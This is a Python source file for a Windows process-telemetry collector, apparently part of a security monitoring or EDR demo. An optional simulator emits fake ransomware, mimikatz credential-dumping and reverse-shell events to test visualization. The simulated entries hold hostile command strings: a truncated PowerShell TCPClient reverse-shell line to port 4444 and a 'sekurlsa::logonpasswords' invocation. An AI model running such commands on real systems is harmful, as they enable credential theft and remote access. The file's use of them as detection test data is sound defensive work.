import os
import sys
import time
import psutil
import threading
import random
from datetime import datetime

class WindowsCollector:
    def __init__(self, on_event=None, on_telemetry=None, simulate=False):
        """
        on_event: callback function triggered for every system event, taking a dict:
                  { pid, process_name, event_type, action, target_path, details, timestamp }
        on_telemetry: callback function triggered for every process sweep, taking a list of process dicts:
                      [{ pid, name, exe, cmdline, username, parent_pid, parent_name, cpu_percent, memory_percent }]
        """
        self.on_event = on_event
        self.on_telemetry = on_telemetry
        self.simulate = simulate
        
        self.seen_files = {} # { pid: set(files) }
        self.seen_connections = {} # { pid: set(conn) }
        self.known_pids = set()
        
        self.stop_event = threading.Event()
        self.collector_thread = None
        self.simulator_thread = None

    def start(self):
        """Start the collector loops in background threads."""
        self.stop_event.clear()
        
        # Start real process collector thread
        self.collector_thread = threading.Thread(target=self._collector_loop, daemon=True)
        self.collector_thread.start()
        
        # Start simulator thread if toggled
        if self.simulate:
            self.simulator_thread = threading.Thread(target=self._threat_simulator_loop, daemon=True)
            self.simulator_thread.start()

    def stop(self):
        """Stop background execution."""
        self.stop_event.set()
        if self.collector_thread:
            self.collector_thread.join(timeout=1.0)
        if self.simulator_thread:
            self.simulator_thread.join(timeout=1.0)

    def _get_process_info(self, proc):
        """Safely gets process metadata, returning None if process exits."""
        try:
            pid = proc.pid
            name = proc.name()
            
            if pid == 0 or pid == os.getpid():
                return None
                
            try:
                exe = proc.exe() or ""
            except (psutil.AccessDenied, psutil.ZombieProcess):
                exe = "[Access Denied]"
                
            try:
                cmdline = " ".join(proc.cmdline())
            except (psutil.AccessDenied, psutil.ZombieProcess):
                cmdline = ""
                
            try:
                username = proc.username()
            except (psutil.AccessDenied, psutil.ZombieProcess):
                username = "SYSTEM"
                
            try:
                ppid = proc.ppid()
                parent = psutil.Process(ppid)
                parent_name = parent.name()
            except (psutil.NoSuchProcess, psutil.AccessDenied, Exception):
                ppid = 0
                parent_name = "unknown"
                
            cpu = proc.cpu_percent(interval=None)
            mem = proc.memory_percent()
            
            return {
                "pid": pid,
                "name": name,
                "exe": exe,
                "cmdline": cmdline,
                "username": username,
                "parent_pid": ppid,
                "parent_name": parent_name,
                "cpu_percent": round(cpu, 2),
                "memory_percent": round(mem, 2)
            }
        except (psutil.NoSuchProcess, psutil.AccessDenied, Exception):
            return None

    def _collector_loop(self):
        while not self.stop_event.is_set():
            self._scan_telemetry()
            # Sweep interval
            time.sleep(3)

    def _scan_telemetry(self):
        processes_payload = []
        current_pids = set()
        
        for proc in psutil.process_iter():
            p_info = self._get_process_info(proc)
            if p_info:
                processes_payload.append(p_info)
                current_pids.add(p_info["pid"])
                
                # Report new process spawns
                if p_info["pid"] not in self.known_pids:
                    self._trigger_event(
                        pid=p_info["pid"],
                        process_name=p_info["name"],
                        event_type="process",
                        action="spawn",
                        target_path=p_info["exe"],
                        details=f"Command line: {p_info['cmdline']}"
                    )
                
                # Check opened resources
                self._scan_process_connections_and_files(proc, p_info["name"])

        self.known_pids = current_pids

        # Emit the telemetry summary callback
        if self.on_telemetry:
            self.on_telemetry(processes_payload)

    def _scan_process_connections_and_files(self, proc, proc_name):
        pid = proc.pid
        
        # 1. Scan network connections
        try:
            conns = proc.connections()
            if pid not in self.seen_connections:
                self.seen_connections[pid] = set()
                
            for conn in conns:
                if conn.status == "ESTABLISHED":
                    raddr = f"{conn.raddr.ip}:{conn.raddr.port}"
                    if raddr not in self.seen_connections[pid]:
                        self.seen_connections[pid].add(raddr)
                        self._trigger_event(
                            pid=pid,
                            process_name=proc_name,
                            event_type="network",
                            action="connect",
                            target_path=raddr,
                            details=f"Local {conn.laddr.ip}:{conn.laddr.port} -> Remote {raddr}"
                        )
        except (psutil.AccessDenied, psutil.NoSuchProcess, Exception):
            pass

        # 2. Scan open files
        try:
            files = proc.open_files()
            if pid not in self.seen_files:
                self.seen_files[pid] = set()
                
            for f in files:
                fpath = f.path
                if fpath not in self.seen_files[pid]:
                    self.seen_files[pid].add(fpath)
                    self._trigger_event(
                        pid=pid,
                        process_name=proc_name,
                        event_type="file",
                        action="read",
                        target_path=fpath,
                        details=f"File handle opened by {proc_name}"
                    )
        except (psutil.AccessDenied, psutil.NoSuchProcess, Exception):
            pass

    def _trigger_event(self, pid, process_name, event_type, action, target_path="", details=""):
        if self.on_event:
            self.on_event({
                "pid": pid,
                "process_name": process_name,
                "event_type": event_type,
                "action": action,
                "target_path": target_path,
                "details": details,
                "timestamp": datetime.now().isoformat()
            })

    def _threat_simulator_loop(self):
        """Generates continuous benign and periodic malicious events to enrich visualization."""
        time.sleep(3) # Wait for initial start
        
        BENIGN_BROWSER_PID = 8812
        RANSOMWARE_PID = 12900
        MIMIKATZ_PID = 14320
        REVERSE_SHELL_PID = 19920
        
        # Initialize simulated processes in heartbeat
        simulated_processes = [
            {
                "pid": BENIGN_BROWSER_PID,
                "name": "chrome_sandbox.exe",
                "exe": "C:\\Program Files\\Google\\Chrome\\chrome_sandbox.exe",
                "cmdline": "--type=utility --utility-sub-type=network.mojom.NetworkService",
                "username": "sharm",
                "parent_pid": 1024,
                "parent_name": "chrome.exe",
                "cpu_percent": 0.5,
                "memory_percent": 1.2
            },
            {
                "pid": RANSOMWARE_PID,
                "name": "cryptolocker.exe",
                "exe": "C:\\Users\\sharm\\AppData\\Local\\Temp\\cryptolocker.exe",
                "cmdline": "--encrypt --path=C:\\Users\\sharm\\Documents",
                "username": "sharm",
                "parent_pid": 4502,
                "parent_name": "explorer.exe",
                "cpu_percent": 45.2,
                "memory_percent": 3.5
            },
            {
                "pid": MIMIKATZ_PID,
                "name": "mimikatz.exe",
                "exe": "C:\\Users\\sharm\\Downloads\\mimikatz.exe",
                "cmdline": "sekurlsa::logonpasswords exit",
                "username": "Administrator",
                "parent_pid": 9928,
                "parent_name": "cmd.exe",
                "cpu_percent": 2.1,
                "memory_percent": 0.8
            },
            {
                "pid": REVERSE_SHELL_PID,
                "name": "powershell.exe",
                "exe": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                "cmdline": "-nop -w hidden -c $c=New-Object System.Net.Sockets.TCPClient('192.168.12.5',4444);...",
                "username": "SYSTEM",
                "parent_pid": 6052,
                "parent_name": "httpd.exe",
                "cpu_percent": 1.5,
                "memory_percent": 1.1
            }
        ]
        
        if self.on_telemetry:
            self.on_telemetry(simulated_processes)
            
        while not self.stop_event.is_set():
            mode = random.choice(["benign", "ransomware", "credential", "shell"])
            try:
                if mode == "benign":
                    self._trigger_event(
                        pid=BENIGN_BROWSER_PID,
                        process_name="chrome_sandbox.exe",
                        event_type="network",
                        action="connect",
                        target_path="142.250.190.46:443",
                        details="TLS Connection established with Google Server"
                    )
                    time.sleep(1)
                    self._trigger_event(
                        pid=BENIGN_BROWSER_PID,
                        process_name="chrome_sandbox.exe",
                        event_type="file",
                        action="read",
                        target_path="C:\\Users\\sharm\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History",
                        details="Browser history read"
                    )
                    
                elif mode == "ransomware":
                    for i in range(12):
                        if self.stop_event.is_set():
                            break
                        doc_name = f"invoice_copy_{i}.pdf"
                        self._trigger_event(
                            pid=RANSOMWARE_PID,
                            process_name="cryptolocker.exe",
                            event_type="file",
                            action="read",
                            target_path=f"C:\\Users\\sharm\\Documents\\{doc_name}",
                            details="Opening original user document"
                        )
                        self._trigger_event(
                            pid=RANSOMWARE_PID,
                            process_name="cryptolocker.exe",
                            event_type="file",
                            action="write",
                            target_path=f"C:\\Users\\sharm\\Documents\\{doc_name}.locked",
                            details="Writing encrypted block payload"
                        )
                        self._trigger_event(
                            pid=RANSOMWARE_PID,
                            process_name="cryptolocker.exe",
                            event_type="file",
                            action="unlink",
                            target_path=f"C:\\Users\\sharm\\Documents\\{doc_name}",
                            details="Deleting original unencrypted document"
                        )
                        time.sleep(0.3)
                        
                elif mode == "credential":
                    self._trigger_event(
                        pid=MIMIKATZ_PID,
                        process_name="mimikatz.exe",
                        event_type="file",
                        action="read",
                        target_path="C:\\Windows\\System32\\config\\SAM",
                        details="Attempted handle access to Security Accounts Manager Database"
                    )
                    time.sleep(1.5)
                    self._trigger_event(
                        pid=MIMIKATZ_PID,
                        process_name="mimikatz.exe",
                        event_type="network",
                        action="connect",
                        target_path="185.190.140.23:80",
                        details="Exfiltrating system sam secrets to malicious command server"
                    )
                    
                elif mode == "shell":
                    self._trigger_event(
                        pid=REVERSE_SHELL_PID,
                        process_name="powershell.exe",
                        event_type="network",
                        action="connect",
                        target_path="192.168.12.5:4444",
                        details="Socket opened to netcat listener"
                    )
                    time.sleep(1.0)
                    for cmd in ["whoami", "ipconfig", "net user", "qwinsta"]:
                        if self.stop_event.is_set():
                            break
                        self._trigger_event(
                            pid=REVERSE_SHELL_PID,
                            process_name="powershell.exe",
                            event_type="process",
                            action="spawn",
                            target_path=f"C:\\Windows\\System32\\{cmd.split()[0]}.exe",
                            details=f"Executing privilege command: {cmd}"
                        )
                        time.sleep(0.5)
            except Exception as e:
                pass
                
            time.sleep(12)
